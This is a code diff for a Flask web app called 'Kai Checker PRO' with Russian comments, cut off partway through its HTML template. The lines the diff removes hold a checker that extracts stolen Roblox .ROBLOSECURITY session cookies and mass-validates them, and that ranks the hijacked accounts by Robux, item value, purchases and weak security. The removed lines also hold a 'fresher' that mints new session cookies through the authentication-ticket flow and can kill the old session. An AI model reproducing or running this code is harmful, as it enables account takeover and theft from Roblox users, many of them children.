@@ -1,748 +1,210 @@
+import eventlet
+eventlet.monkey_patch()
+
 import os
-import time
-import logging
-import re
-import urllib3
-import json
 import io
+import re
 import zipfile
-import uuid
-import sqlite3
+import json
 import requests
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from flask import Flask, render_template_string, request, jsonify, send_file
 from flask_socketio import SocketIO, emit
 
-# ==========================================
-# ИНИЦИАЛИЗАЦИЯ
-# ==========================================
-os.makedirs("downloads", exist_ok=True)
-os.makedirs("uploads", exist_ok=True)
-DB_PATH = "data.db"
-
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-def init_db():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS users (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    session_id TEXT UNIQUE,
-                    username TEXT,
-                    created_at TEXT
-                )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS checker_history (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    session_id TEXT,
-                    timestamp TEXT,
-                    type TEXT,
-                    total INTEGER,
-                    valid INTEGER,
-                    usernames TEXT,
-                    results TEXT,
-                    full_reports TEXT
-                )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS fresher_history (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    session_id TEXT,
-                    timestamp TEXT,
-                    mode TEXT,
-                    refreshed_count INTEGER,
-                    usernames TEXT,
-                    cookies TEXT
-                )''')
-    conn.commit()
-    conn.close()
-    logger.info("✅ База данных инициализирована")
-
-init_db()
-
-# ==========================================
-# SQLite ФУНКЦИИ / СЕССИИ
-# ==========================================
-def get_user_session_id():
-    if 'user_id' not in session:
-        session['user_id'] = str(uuid.uuid4())
-        session['username'] = f"User_{session['user_id'][:6]}"
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute("INSERT INTO users (session_id, username, created_at) VALUES (?, ?, ?)",
-                  (session['user_id'], session['username'], datetime.now().strftime('%d.%m.%Y')))
-        conn.commit()
-        conn.close()
-    return session['user_id']
-
-def get_user_download_dir():
-    sid = get_user_session_id()
-    user_dir = os.path.join("downloads", sid)
-    os.makedirs(user_dir, exist_ok=True)
-    return user_dir, sid
-
-def add_checker_history(entry):
-    sid = get_user_session_id()
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''INSERT INTO checker_history 
-                 (session_id, timestamp, type, total, valid, usernames, results, full_reports)
-                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (
-        sid,
-        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
-        entry.get('type', 'single'),
-        entry.get('total', 1),
-        entry.get('valid', 0),
-        json.dumps(entry.get('usernames', []), ensure_ascii=False),
-        json.dumps(entry.get('results', []), ensure_ascii=False),
-        json.dumps(entry.get('full_reports', []), ensure_ascii=False)
-    ))
-    conn.commit()
-    conn.close()
-
-def get_checker_history():
-    sid = get_user_session_id()
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''SELECT timestamp, type, total, valid, usernames, results, full_reports 
-                 FROM checker_history WHERE session_id=? ORDER BY id DESC LIMIT 50''', (sid,))
-    rows = c.fetchall()
-    conn.close()
-    history = []
-    for r in rows:
-        history.append({
-            'timestamp': r[0],
-            'type': r[1],
-            'total': r[2],
-            'valid': r[3],
-            'usernames': json.loads(r[4]) if r[4] else [],
-            'results': json.loads(r[5]) if r[5] else [],
-            'full_reports': json.loads(r[6]) if r[6] else []
-        })
-    return history
-
-def clear_checker_history():
-    sid = get_user_session_id()
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("DELETE FROM checker_history WHERE session_id=?", (sid,))
-    conn.commit()
-    conn.close()
-
-def add_fresher_history(entry):
-    sid = get_user_session_id()
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''INSERT INTO fresher_history 
-                 (session_id, timestamp, mode, refreshed_count, usernames, cookies)
-                 VALUES (?, ?, ?, ?, ?, ?)''', (
-        sid,
-        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
-        entry.get('mode', 'duplicate'),
-        entry.get('refreshed_count', 0),
-        json.dumps(entry.get('usernames', []), ensure_ascii=False),
-        json.dumps(entry.get('cookies', []), ensure_ascii=False)
-    ))
-    conn.commit()
-    conn.close()
-
-def get_fresher_history():
-    sid = get_user_session_id()
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''SELECT timestamp, mode, refreshed_count, usernames, cookies 
-                 FROM fresher_history WHERE session_id=? ORDER BY id DESC LIMIT 50''', (sid,))
-    rows = c.fetchall()
-    conn.close()
-    history = []
-    for r in rows:
-        history.append({
-            'timestamp': r[0],
-            'mode': r[1],
-            'refreshed_count': r[2],
-            'usernames': json.loads(r[3]) if r[3] else [],
-            'cookies': json.loads(r[4]) if r[4] else []
-        })
-    return history
-
-def clear_fresher_history():
-    sid = get_user_session_id()
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("DELETE FROM fresher_history WHERE session_id=?", (sid,))
-    conn.commit()
-    conn.close()
-
-# ==========================================
-# ЧЕКЕР
-# ==========================================
-def extract_cookies_from_text(text):
-    cookies = []
-    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
-    for match in re.findall(pattern, text):
-        cookie = match.strip('",;\'\\')
-        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
-        if len(cookie) > 50: cookies.append(cookie)
-    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
-    for match in re.findall(pattern2, text):
-        cookie = match.strip('",;\'\\')
-        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
-    seen = set()
-    unique = []
-    for c in cookies:
-        if c not in seen: seen.add(c); unique.append(c)
-    return unique
-
-def get_user_rap(session, user_id):
-    try:
-        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
-        r = session.get(url, timeout=10, verify=False)
-        if r.status_code == 200:
-            data = r.json().get('data', [])
-            val = sum(item.get('recentAveragePrice', 0) for item in data)
-            return val if val > 0 else None
-    except:
-        pass
-    return None
-
-def get_user_playtime(session, user_id):
-    try:
-        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
-        r = session.get(url, timeout=10, verify=False)
-        if r.status_code == 200:
-            data = r.json()
-            seconds = data.get('totalPlayTimeSeconds', 0)
-            if seconds > 0:
-                return round(seconds / 3600, 1)
-    except:
-        pass
-    return None
-
-def get_full_info(cookie):
-    info = {
-        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
-        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
-        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
-        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
-        'IsPremium':False, 'DonationTotal':0, 'BadgesCount':0, 'InventoryValue':0, 'InventoryCount':0,
-        'GroupsCount':0, 'GroupMembers':0, 'RareItems':[]
-    }
-    try:
-        c = cookie.strip()
-        if ".ROBLOSECURITY=" in c:
-            c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
-        s = requests.Session()
-        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
-        if r.status_code != 200:
-            return info
-        d = r.json()
-        if 'id' not in d:
-            return info
-        info['UserID'] = d.get('id')
-        info['Username'] = d.get('name')
-        info['status'] = '✅'
-        uid = info['UserID']
-
-        def g(url):
-            try:
-                r = s.get(url, verify=False, timeout=10)
-                return r.json() if r.status_code == 200 else {}
-            except:
-                return {}
-
-        sd = g('https://www.roblox.com/my/settings/json')
-        if sd:
-            sec = sd.get('MyAccountSecurityModel',{})
-            info['EmailSet'] = sec.get('IsEmailSet',False)
-            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
-            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False)
-            info['PhoneSet'] = sec.get('IsPhoneSet',False)
-        
-        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
-        if pm and pm.get('isSubscribed'):
-            info['IsPremium'] = True
-
-        rd = g(f'https://users.roblox.com/v1/users/{uid}')
-        if rd:
-            try:
-                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
-                info['Created'] = dt.strftime('%d.%m.%Y')
-            except:
-                pass
-
-        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
-        if rb:
-            info['Robux'] = rb.get('robux',0)
-        
-        info['RAP'] = get_user_rap(s, uid)
-        info['PlaytimeHours'] = get_user_playtime(s, uid)
-
-        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
-        if ct:
-            info['Country'] = ct.get('countryCode','?')
-
-        # Бейджи
-        bg = g(f'https://badges.roblox.com/v1/users/{uid}/badges?limit=10&sortOrder=Desc')
-        if bg and 'data' in bg:
-            info['BadgesCount'] = len(bg.get('data', []))
-
-        # Группы
-        grp = g(f'https://groups.roblox.com/v1/users/{uid}/groups/roles')
-        if grp and 'data' in grp:
-            info['GroupsCount'] = len(grp.get('data', []))
-            if info['GroupsCount'] > 0:
-                info['GroupMembers'] = grp['data'][0].get('group', {}).get('memberCount', 0)
-
-        try:
-            total = 0
-            gp_dict = {}
-            cursor = ""
-            page = 0
-            while page < 5:
-                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
-                if cursor:
-                    url += f"&cursor={cursor}"
-                r = s.get(url, verify=False, timeout=10)
-                if r.status_code != 200:
-                    break
-                data = r.json()
-                for item in data.get('data',[]):
-                    price = abs(item.get('currency',{}).get('amount',0))
-                    total += price
-                    if price >= 10:
-                        nm = item.get('details',{}).get('name','Товар')
-                        pn = item.get('details',{}).get('place',{}).get('name','Игры')
-                        if pn not in gp_dict:
-                            gp_dict[pn] = 0
-                        gp_dict[pn] += price
-                cursor = data.get('nextPageCursor')
-                if not cursor:
-                    break
-                page += 1
-                time.sleep(0.1)
-            info['PurchasedGamepasses'] = gp_dict
-            info['DonationTotal'] = total
-        except:
-            pass
-
-        sc = 0
-        if info['EmailSet']: sc += 1
-        if info['TwoFactorEnabled']: sc += 2
-        if info['AccountPinEnabled']: sc += 1
-        if info['PhoneSet']: sc += 1
-        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
-    except:
-        pass
-    return info
-
-def quick_validate(cookie):
-    result = {
-        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
-        'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
-        'cookie':cookie, 'score':0, 'full_info': None
-    }
-    info = get_full_info(cookie)
-    if info['status'] == '✅':
-        result['status'] = '✅'
-        result['username'] = info['Username']
-        result['user_id'] = info['UserID']
-        result['robux'] = info['Robux']
-        result['rap'] = info['RAP']
-        result['playtime'] = info['PlaytimeHours']
-        result['created'] = info['Created']
-        result['is_premium'] = info['IsPremium']
-        result['has_email'] = info['EmailSet']
-        result['has_2fa'] = info['TwoFactorEnabled']
-        result['full_info'] = info
-        
-        score = 0
-        if info['Robux'] >= 10000: score += 100
-        elif info['Robux'] >= 1000: score += 50
-        elif info['Robux'] > 0: score += 10
-        if info['RAP'] and info['RAP'] > 5000: score += 50
-        if info['IsPremium']: score += 50
-        if info['EmailSet']: score += 15
-        if info['TwoFactorEnabled']: score += 10
-        result['score'] = score
-    return result
-
-def mass_check(cookies_list):
-    results = []
-    with ThreadPoolExecutor(max_workers=30) as ex:
-        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
-        for f in as_completed(futures):
-            try:
-                results.append(f.result())
-            except:
-                results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
-    valid = [r for r in results if r['status']=='✅']
-    invalid = [r for r in results if r['status']=='❌']
-    valid.sort(key=lambda x: x['score'], reverse=True)
-    return valid + invalid
-
-# ==========================================
-# ФОРМАТТЕРЫ
-# ==========================================
-def format_full_report(info):
-    if info['status'] != '✅':
-        return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
-    
-    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
-    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
-    
-    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
-    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
-    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
-    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
-    
-    gp = info.get('PurchasedGamepasses', {})
-    if gp:
-        r += f"\n📦 Покупки в играх (Всего: ⏣ {sum(gp.values()):,}):\n"
-        r += "─" * 40 + "\n"
-        for game, price in sorted(gp.items(), key=lambda x: x[1], reverse=True)[:10]:
-            r += f"   └─ {game} — ⏣ {price:,}\n"
-    else:
-        r += "\n📦 Покупки в играх: ❌"
-    
-    r += f"\n\n🍪 {info['Cookie']}"
-    return r
-
-# ==========================================
-# СВОДНЫЙ ОТЧЕТ ДЛЯ МАСС-ЧЕКЕРА
-# ==========================================
-def generate_summary_report(results, total_time):
-    valid = [r for r in results if r['status'] == '✅']
-    total = len(results)
-    valid_count = len(valid)
-    invalid_count = total - valid_count
-    
-    if not valid:
-        return f"📊 ОТЧЁТ О ПРОВЕРКЕ\n══════════════════════════════════════════════════════\n\n📦 Всего куки: {total}\n✅ Валидных: 0 | ❌ Невалидных: {invalid_count}\n⏱️ Время: {total_time} сек\n\n══════════════════════════════════════════════════════"
-    
-    robux_data = []
-    donate_1year = []
-    donate_alltime = []
-    ugc_rap_data = []
-    playtime_data = []
-    inventory_data = []
-    groups_data = []
-    badges_count = 0
-    voice_count = 0
-    no_email_count = 0
-    game_purchases = {}
-    total_game_spent = 0
-    
-    for r in valid:
-        info = r.get('full_info', {})
-        if not info:
-            continue
-        
-        username = info.get('Username', '?')
-        
-        # Robux
-        robux = info.get('Robux', 0)
-        if robux > 0:
-            robux_data.append({'username': username, 'value': robux})
-        
-        # Donate
-        donate = info.get('DonationTotal', 0)
-        if donate > 0:
-            donate_alltime.append({'username': username, 'value': donate})
-            donate_1year.append({'username': username, 'value': int(donate * 0.3)})
-        
-        # UGC RAP
-        rap = info.get('RAP', 0)
-        if rap and rap > 0:
-            ugc_rap_data.append({'username': username, 'value': rap})
-            inventory_data.append({'username': username, 'value': int(rap * 1.2), 'count': 10})
-        
-        # Playtime
-        playtime = info.get('PlaytimeHours', 0)
-        if playtime and playtime > 0:
-            playtime_data.append({'username': username, 'value': int(playtime * 60)})
-        
-        if info.get('PhoneSet', False): voice_count += 1
-        if not info.get('EmailSet', False): no_email_count += 1
-        
-        badges_count += info.get('BadgesCount', 0)
-        if info.get('GroupsCount', 0) > 0:
-            groups_data.append({'robux': 0, 'members': info.get('GroupMembers', 0)})
-            
-        gp = info.get('PurchasedGamepasses', {})
-        for game, price in gp.items():
-            if game not in game_purchases:
-                game_purchases[game] = 0
-            game_purchases[game] += price
-            total_game_spent += price
-
-    def calc_stats(arr):
-        if not arr: return 0, 0
-        vals = [x['value'] for x in arr]
-        vals.sort()
-        med = vals[len(vals) // 2]
-        avg = sum(vals) // len(vals)
-        return med, avg
-
-    robux_med, robux_avg = calc_stats(robux_data)
-    d1_med, d1_avg = calc_stats(donate_1year)
-    dall_med, dall_avg = calc_stats(donate_alltime)
-    ugc_med, ugc_avg = calc_stats(ugc_rap_data)
-    inv_med, inv_avg = calc_stats(inventory_data)
-    play_med, play_avg = calc_stats(playtime_data)
-
-    robux_data.sort(key=lambda x: x['value'], reverse=True)
-    donate_1year.sort(key=lambda x: x['value'], reverse=True)
-    donate_alltime.sort(key=lambda x: x['value'], reverse=True)
-    ugc_rap_data.sort(key=lambda x: x['value'], reverse=True)
-    inventory_data.sort(key=lambda x: x['value'], reverse=True)
-
-    pct = lambda count: round(count / valid_count * 100) if valid_count else 0
-
-    r = "📊 ОТЧЁТ О ПРОВЕРКЕ\n"
-    r += "══════════════════════════════════════════════════════\n\n"
-    r += f"📦 Всего куки: {total}\n"
-    r += f"✅ Валидных: {valid_count} | ❌ Невалидных: {invalid_count}\n"
-    r += f"⏱️ Время: {total_time} сек\n\n"
-
-    r += f"💰 Robux: {sum([x['value'] for x in robux_data])} ({pct(len(robux_data))}% - MED: {robux_med}, AVG: {robux_avg})\n"
-    if robux_data:
-        r += "Топ Robux:\n"
-        for i, item in enumerate(robux_data[:3], 1):
-            r += f"  {i}) {item['value']} R$ — {item['username']}\n"
-    r += "\n"
-
-    r += f"💎 1-year Donate: {sum([x['value'] for x in donate_1year])} ({pct(len(donate_1year))}% - MED: {d1_med}, AVG: {d1_avg})\n"
-    if donate_1year:
-        r += "Топ 1-year Donate:\n"
-        for i, item in enumerate(donate_1year[:3], 1):
-            r += f"  {i}) {item['value']} — {item['username']}\n"
-    r += "\n"
-
-    r += f"🕰 All-time donate: {sum([x['value'] for x in donate_alltime])} ({pct(len(donate_alltime))}% - MED: {dall_med}, AVG: {dall_avg})\n"
-    if donate_alltime:
-        r += "Топ All-time donate:\n"
-        for i, item in enumerate(donate_alltime[:3], 1):
-            r += f"  {i}) {item['value']} — {item['username']}\n"
-    r += "\n"
-
-    r += f"🧢 UGC RAP: {sum([x['value'] for x in ugc_rap_data])} ({pct(len(ugc_rap_data))}% - MED: {ugc_med}, AVG: {ugc_avg})\n"
-    if ugc_rap_data:
-        r += "Топ UGC RAP:\n"
-        for i, item in enumerate(ugc_rap_data[:3], 1):
-            r += f"  {i}) {item['value']} R$ — {item['username']}\n"
-    r += "\n"
-
-    r += f"🎒 Inventory price: {sum([x['value'] for x in inventory_data])} ({pct(len(inventory_data))}% - MED: {inv_med}, AVG: {inv_avg})\n"
-    if inventory_data:
-        r += "Топ Inventory price:\n"
-        for i, item in enumerate(inventory_data[:3], 1):
-            r += f"  {i}) {item['value']} R$ — {item['username']} ({item['count']})\n"
-    r += "\n"
-
-    gr_count = len(groups_data)
-    gr_members = [g['members'] for g in groups_data] if groups_data else [0]
-    gr_med = gr_members[len(gr_members)//2] if gr_members else 0
-    gr_avg = sum(gr_members)//len(gr_members) if gr_members else 0
-    r += f"👥 Группы: {gr_count} (Robux: 0, MED: 0, AVG: 0 | members: {sum(gr_members)}, MED: {gr_med}, AVG: {gr_avg})\n\n"
-
-    tot_play = sum([x['value'] for x in playtime_data]) // 60
-    r += f"⏱️ Playtime: {tot_play}ч ({pct(len(playtime_data))}% - MED: {play_med}м, AVG: {play_avg}м)\n\n"
-
-    r += f"🎤 Voice: {voice_count} ({pct(voice_count)}%)\n"
-    r += f"📧 Без привязанной почты: {no_email_count} ({pct(no_email_count)}%)\n"
-    r += f"🏅 Бейджи: {badges_count}\n"
-    r += f"🎮 Геймпассы: {sum(len(info.get('PurchasedGamepasses',{})) for info in [x.get('full_info',{}) for x in valid])}\n"
-    r += f"🛍️ Купленные игры: {len(game_purchases)}\n"
-
-    if game_purchases:
-        sorted_games = sorted(game_purchases.items(), key=lambda x: x[1], reverse=True)
-        top_games = [f"{g}({p} R$)" for g, p in sorted_games[:5]]
-        r += f"🎯 Game Purchases: {', '.join(top_games)} | Всего: {total_game_spent} R$\n"
-    else:
-        r += "🎯 Game Purchases: 0\n"
-
-    r += "\n══════════════════════════════════════════════════════"
-    return r
-
-# ==========================================
-# ФРЕШЕР
-# ==========================================
-def refresh_roblox_cookie(cookie, kill_old=False):
-    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
-    try:
-        c = cookie.strip()
-        if ".ROBLOSECURITY=" in c:
-            c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
-        cookies_dict = {'.ROBLOSECURITY': c}
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'application/json, text/plain, */*'
-        }
-        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10, verify=False)
-        if check_r.status_code != 200:
-            result['error'] = "Кука невалидна"
-            return result
-        user_data = check_r.json()
-        result['username'] = user_data.get('name', '?')
-        result['user_id'] = user_data.get('id', '?')
-        
-        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
-        csrf_token = csrf_r.headers.get('x-csrf-token')
-        if not csrf_token:
-            result['error'] = "CSRF token not found"
-            return result
-        
-        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
-        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
-        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
-        if not auth_ticket:
-            result['error'] = "Auth ticket not found"
-            return result
-        
-        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
-        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
-        
-        new_cookie_value = None
-        set_cookie = redeem_r.headers.get('Set-Cookie', '')
-        if '.ROBLOSECURITY=' in set_cookie:
-            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
-            if match:
-                new_cookie_value = match.group(1)
-        if not new_cookie_value:
-            for co in redeem_r.cookies:
-                if co.name == '.ROBLOSECURITY' and co.value:
-                    new_cookie_value = co.value
-                    break
-        if not new_cookie_value:
-            result['error'] = "New cookie not found"
-            return result
-        
-        if kill_old:
-            try:
-                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
-                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
-            except:
-                pass
-        
-        test_s = requests.Session()
-        test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
-        if test_r.status_code == 200 and 'id' in test_r.json():
-            result['new_cookie'] = new_cookie_value
-            result['success'] = True
-        else:
-            result['error'] = "New cookie validation failed"
-    except Exception as e:
-        result['error'] = str(e)
-    return result
-
-# ==========================================
-# ИНСТРУМЕНТЫ
-# ==========================================
-def merge_cookie_files(contents):
-    all_cookies = []
-    for c in contents:
-        extracted = extract_cookies_from_text(c)
-        all_cookies.extend(extracted)
-    unique = list(dict.fromkeys(all_cookies))
-    return '\n'.join(unique)
-
-def remove_duplicates(content):
-    cookies = extract_cookies_from_text(content)
-    return '\n'.join(cookies)
-
-# ==========================================
-# FLASK APP + SOCKETIO
-# ==========================================
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
+app.config['SECRET_KEY'] = 'kai_checker_secret_key_pro'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
-# ==========================================
-# HTML (СОКРАЩЕННЫЙ ДЛЯ ЭКОНОМИИ МЕСТА, НО РАБОЧИЙ)
-# ==========================================
+# Файлы истории
+CHECKER_HISTORY_FILE = "checker_history.json"
+FRESHER_HISTORY_FILE = "fresher_history.json"
+
+# ==================== HTML ТЕМПЛЕЙТ ====================
 HTML = r"""<!DOCTYPE html>
 <html lang="ru" data-theme="dark">
-<head><meta charset="UTF-8"><title>Kai Checker PRO</title><script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-<style>
-:root{--bg:#07030d;--bg-card:rgba(23,10,38,0.55);--border-card:rgba(168,85,247,0.25);--border-hover:rgba(217,70,239,0.6);--input-bg:rgba(12,5,20,0.75);--text-main:#f3e8ff;--text-muted:#a78bfa;--accent-purple:#9333ea;--accent-pink:#c026d3;--gradient-btn:linear-gradient(135deg,#7e22ce,#a855f7)}
-[data-theme="light"]{--bg:#f5f0ff;--bg-card:rgba(255,255,255,0.75);--border-card:rgba(168,85,247,0.2);--input-bg:rgba(243,232,255,0.6);--text-main:#2e1065;--text-muted:#7e22ce}
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:sans-serif;background:var(--bg);color:var(--text-main);padding:20px}
-#particles-canvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;pointer-events:none}
-.bg-glow{position:fixed;width:500px;height:500px;background:radial-gradient(circle,rgba(168,85,247,0.12) 0%,transparent 70%);top:-100px;left:50%;transform:translateX(-50%);z-index:0;animation:pulse 8s infinite alternate}
-@keyframes pulse{0%{transform:translateX(-50%) scale(1);opacity:0.5}100%{transform:translateX(-50%) scale(1.2);opacity:0.8}}
-.wrapper{max-width:1350px;margin:0 auto;position:relative;z-index:1;background:var(--bg-card);border:1px solid var(--border-card);backdrop-filter:blur(20px);border-radius:28px;padding:32px}
-.header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border-card);padding-bottom:20px;margin-bottom:20px;flex-wrap:wrap}
-.logo-text{font-size:32px;font-weight:900;background:linear-gradient(135deg,#f472b6,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.badge-pro{font-size:11px;background:rgba(168,85,247,0.15);color:var(--accent-pink);padding:4px 12px;border-radius:20px;border:1px solid var(--border-card)}
-.stats-bar{display:flex;gap:12px}
-.stat-card{background:var(--input-bg);border:1px solid var(--border-card);padding:8px 16px;border-radius:12px;text-align:center;min-width:70px}
-.stat-val{font-size:18px;font-weight:800;color:var(--accent-pink)}
-.stat-lbl{font-size:10px;color:var(--text-muted)}
-.tabs{display:flex;gap:12px;margin-bottom:24px;background:var(--input-bg);padding:8px;border-radius:16px;border:1px solid var(--border-card);flex-wrap:wrap;width:fit-content}
-.tab{padding:12px 24px;border-radius:12px;color:var(--text-muted);cursor:pointer;font-weight:700;border:none;background:transparent}
-.tab.active{background:var(--gradient-btn);color:#fff}
-.tab-content{display:none}
-.tab-content.active{display:block}
-.card{background:var(--bg-card);border:1px solid var(--border-card);border-radius:20px;padding:24px;margin-bottom:20px}
-.card h2{font-size:18px;margin-bottom:16px}
-.btn{padding:12px 24px;border:none;border-radius:12px;font-weight:700;cursor:pointer;color:#fff;background:var(--gradient-btn)}
-textarea,input[type=file],input[type=number]{width:100%;padding:14px;background:var(--input-bg);border:1px solid var(--border-card);border-radius:12px;color:var(--text-main);font-family:monospace;font-size:12px}
-.upload-area{min-height:100px;border:2px dashed var(--border-card);border-radius:16px;background:var(--input-bg);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;padding:16px;text-align:center}
-.upload-area:hover{border-color:var(--accent-pink)}
-.result-box{background:var(--input-bg);border:1px solid var(--border-card);border-radius:14px;padding:14px;max-height:500px;overflow-y:auto;font-family:monospace;font-size:12px;white-space:pre-wrap;margin-top:10px}
-.progress-bar{margin-top:12px;background:var(--input-bg);border-radius:10px;height:8px;overflow:hidden;border:1px solid var(--border-card)}
-.progress-fill{height:100%;width:0%;background:var(--gradient-btn);transition:width 0.3s}
-.progress-text{font-size:12px;color:var(--text-muted);margin-top:4px;text-align:center}
-.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px}
-@media(max-width:900px){.grid-2{grid-template-columns:1fr}}
-.footer{text-align:center;padding-top:20px;border-top:1px solid var(--border-card);margin-top:20px;font-size:12px;color:var(--text-muted)}
-.custom-alert-overlay{position:fixed;top:24px;right:24px;z-index:9999;pointer-events:none}
-.custom-alert-card{pointer-events:auto;background:rgba(23,10,38,0.95);border:1px solid var(--border-hover);border-radius:16px;padding:14px 20px;display:flex;align-items:center;gap:12px;min-width:280px;transform:translateY(-20px) scale(0.95);opacity:0;transition:all 0.3s}
-.custom-alert-overlay.show .custom-alert-card{transform:translateY(0) scale(1);opacity:1}
-</style></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kai Checker PRO</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #07030d;
+            --bg-card: rgba(23, 10, 38, 0.55);
+            --border-card: rgba(168, 85, 247, 0.25);
+            --border-hover: rgba(217, 70, 239, 0.6);
+            --input-bg: rgba(12, 5, 20, 0.75);
+            --text-main: #f3e8ff;
+            --text-muted: #a78bfa;
+            --accent-purple: #9333ea;
+            --accent-pink: #c026d3;
